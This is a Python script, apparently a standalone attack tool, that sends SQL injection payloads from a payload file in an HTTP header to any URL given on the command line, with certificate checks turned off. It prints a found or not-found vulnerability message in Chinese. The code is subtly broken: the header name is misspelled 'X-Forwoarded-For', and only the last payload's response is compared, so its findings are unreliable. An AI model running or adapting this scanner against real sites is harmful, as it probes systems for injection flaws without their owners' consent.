import requests
import sys
from requests.packages import urllib3

print('\033[1;34m################\033[0m█▄▄▄▄ ▄███▄   ██▄█▄▄▄▄ ▄███▄   ██▄\033[1;34m##################\033[0m\n')
print('\033[1;34m################\033[0m█Author：PURPLE-WL ***  ▀███▀    █\033[1;34m##################\033[0m\n')
print('\033[1;34m################\033[0m█Version: V1.0 ***      ▄███▄    █\033[1;34m##################\033[0m\n')
print('\033[1;34m################\033[0m█https://github.com/purple-WL ***█\033[1;34m##################\033[0m\n')
print('\033[1;34m################\033[0m█   ▀███▀   ███▀   ▐  █   ▀███▀  █\033[1;34m##################\033[0m\n')

urllib3.disable_warnings()
if len(sys.argv) == 1:
    print('请指定1个URL：格式为http(https)://xxx.com''\n'
          'eg: python3 X-Forwoarded-For-SQL_inject.py http://xxx.com''\n')
else:
  url = sys.argv[1]



  '''proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
  }'''

  with open('config/payload.txt',"r") as f:
     for line in f.readlines():
        line = line.strip()
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.3',
                   'X-Forwoarded-For': line,
                   'Referrer': url,
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                   'Accept-Encoding': 'gzip, deflate, sdch,identity',
                   'Accept-Language': 'zh-CN,zh;q=0.8,ja;q=0.6'
                   }
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.3',
            'Referrer': url,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, sdch,identity',
            'Accept-Language': 'zh-CN,zh;q=0.8,ja;q=0.6'
            }

        req = requests.get(url,headers=headers1,verify=False)
        resp = requests.get(url,headers=headers,verify=False)
     if resp.status_code != req.status_code:
        print("\033[0;32;47m %s                    + 存在X-Forwoarded-For注入漏洞 \033[0m" % (url))
     else:
        print("\033[0;31;47m %s                    - 未发现漏洞信息 \033[0m" % (url))
